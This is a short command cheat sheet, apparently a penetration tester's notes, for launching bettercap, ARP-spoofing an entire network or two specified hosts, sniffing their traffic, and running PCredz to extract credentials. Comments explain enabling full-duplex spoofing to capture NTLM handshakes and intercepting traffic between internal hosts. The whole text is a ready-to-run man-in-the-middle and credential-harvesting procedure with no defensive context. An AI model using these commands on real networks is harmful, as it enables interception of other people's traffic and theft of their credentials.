

#Launch bettercap
sudo bettercap -iface enp0s3
#ARP Spoof on the entire network:
> net.recon on
> get arp.spoof.*
> (set arp.spoof.fullduplex true) #if you want to capture ntlm handshakes or server responses in general
> (set arp.spoof.internals true) #if you want to intercept trafic between internal hosts (not only with the gateway)
> arp.spoof on
> net.sniff on


#ARP Spoof on two machines inside the network:
> net.recon on
> net.show
> (set arp.spoof.fullduplex true) #if you want to capture ntlm handshakes or server responses in general
> (set arp.spoof.internals true) #if you want to intercept trafic between internal hosts (not only with the gateway)
> set arp.spoof.targets 10.54.251.49,10.54.251.45
> arp.spoof on

#Launch PCredz
sudo python3 /opt/outils/reseau/analyse/PCredz/Pcredz -i enp0s3
